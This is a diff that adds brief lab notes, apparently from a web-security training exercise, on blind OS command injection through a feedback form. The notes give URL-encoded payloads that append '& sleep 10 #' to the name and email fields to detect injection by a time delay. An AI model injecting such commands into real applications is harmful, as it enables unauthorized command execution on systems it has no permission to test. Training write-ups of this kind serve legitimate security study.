@@ -1,0 +1,15 @@
+Blind OS command injection with time delays
+Goal: Exploit blind command injection in the feedback function.
+
+1)
+-Click Submit feedback
+-Fill out form
+-Click Submit feedback
+
+2)
+-Send the post to repeater
+-name=Mike & sleep 10 #, url encode, name%3dMike+%26+sleep+10+%23
+-> Negative
+-email=mike%40aol.com & sleep 10 #, url encode,email=mike%40aol.com+%26+sleep+10+%23
+
+; will work instead of # as well
